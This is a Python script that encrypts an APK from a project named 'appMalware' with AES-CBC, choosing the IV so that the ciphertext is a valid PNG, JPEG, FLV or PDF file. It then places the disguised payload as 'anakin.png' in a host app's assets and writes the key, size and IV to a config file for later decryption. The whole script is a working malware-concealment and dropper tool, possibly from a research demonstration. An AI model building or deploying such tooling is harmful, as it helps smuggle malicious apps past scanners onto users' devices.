import struct
import sys
import binascii
import os

PNGSIG = '\x89PNG\r\n\x1a\n'
JPGSIG = "\xff\xd8"
FLVSIG = "FLV"

# variables
# source_file -> apk
# target_file -> input file PDF/PNG/JPG
# result_file -> is source_file with appended 'garbage' in the form of the target_file

source_file = "../Android/appMalware/build/outputs/apk/release/appMalware-release.apk"
target_file = "../Resources/fake_car.png"
result_file = "../Android/appHost/src/main/assets/anakin.png"
key = os.urandom(16).encode('hex')
algo = "aes"

if algo.lower() == "aes":
    from Crypto.Cipher import AES
    algo = AES
    BS = 16
else:
    from Crypto.Cipher import DES3 # will work only with JPEG as others require 16 bytes block size
    algo = DES3
    BS = 8

pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS) # non-standard padding might be preferred for PDF

with open(source_file, "rb") as f:
    s = pad(f.read())

with open(target_file, "rb") as f:
    t = pad(f.read())

p = s[:BS] # our first plaintext block
ecb_dec = algo.new(key, algo.MODE_ECB)

# we need to generate our first cipher block, depending on the target type

if t.startswith(PNGSIG): #PNG
    assert BS >= 16
    size = len(s) - BS

    # our dummy chunk type
    # 4 letters, first letter should be lowercase to be ignored
    chunktype = 'aaaa'

    # PNG signature, chunk size, our dummy chunk type
    c = PNGSIG + struct.pack(">I",size) + chunktype

    c = ecb_dec.decrypt(c)
    IV = "".join([chr(ord(c[i]) ^ ord(p[i])) for i in range(BS)])
    cbc_enc = algo.new(key, algo.MODE_CBC, IV)
    result = cbc_enc.encrypt(s)

    #write the CRC of the remaining of s at the end of our dummy block
    result = result + struct.pack(">I", binascii.crc32(result[12:]) % 0x100000000)
    #and append the actual data of t, skipping the sig
    result = result + t[8:]

elif t.startswith(JPGSIG): #JPG
    assert BS >= 2

    size = len(s) - BS # we could make this shorter, but then could require padding again

    # JPEG Start of Image, COMment segment marker, segment size, padding
    c = JPGSIG + "\xFF\xFE" + struct.pack(">H",size) + "\0" * 10

    c = ecb_dec.decrypt(c)
    IV = "".join([chr(ord(c[i]) ^ ord(p[i])) for i in range(BS)])
    cbc_enc = algo.new(key, algo.MODE_CBC, IV)
    result = cbc_enc.encrypt(s)

    #and append the actual data of t, skipping the sig
    result = result + t[2:]
elif t.startswith(FLVSIG):
    assert BS >= 9
    size = len(s) - BS # we could make this shorter, but then could require padding again

    # reusing FLV's sig and type, data offset, padding
    c = t[:5] + struct.pack(">I",size + 16) + "\0" * 7

    c = ecb_dec.decrypt(c)
    IV = "".join([chr(ord(c[i]) ^ ord(p[i])) for i in range(BS)])
    cbc_enc = algo.new(key, algo.MODE_CBC, IV)
    result = cbc_enc.encrypt(s)

    #and append the actual data of t, skipping the sig
    result = result + t[9:]
elif t.find("%PDF-") > -1:
    assert BS >= 16
    size = len(s) - BS # we take the whole first 16 bits

    #truncated signature, dummy stream object start
    c = "%PDF-\0obj\nstream"

    c = ecb_dec.decrypt(c)
    IV = "".join([chr(ord(c[i]) ^ ord(p[i])) for i in range(BS)])
    cbc_enc = algo.new(key, algo.MODE_CBC, IV)
    result = cbc_enc.encrypt(s)

    #close the dummy object and append the whole t
    #(we don't know where the sig is, we can't skip anything)
    result = result + "\nendstream\nendobj\n" + t

else:
    print "file type not supported"
    sys.exit()


#we have our result, key and IV

#generate the result file
cbc_dec = algo.new(key, algo.MODE_CBC, IV)
with open(result_file, "wb") as f:
    f.write(pad(result))

print("Finished encryption successfully!")

#write contents to file
apk_size = os.path.getsize(source_file)

iv_string=""
for i in range(len(IV)):
    iv_string+= IV[i].encode('hex');

file = open('../Android/appHost/src/main/assets/config', 'w')
file.writelines("%s\n"%key)
file.writelines("%s\n"%apk_size)
file.writelines("%s"%iv_string)
file.close()
